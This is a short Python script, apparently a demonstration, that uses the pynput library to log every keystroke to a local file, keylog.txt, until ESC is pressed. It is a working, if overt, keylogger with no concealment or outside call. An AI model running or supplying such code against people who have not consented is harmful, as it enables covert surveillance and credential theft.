from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key.name}]")
        if key == keyboard.Key.esc:
            print("ESC pressed. Exiting...")
            return False  # Stop listener
    except Exception as e:
        print("Error writing to log file:", e)

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started... Press ESC to stop.")
    listener.join()
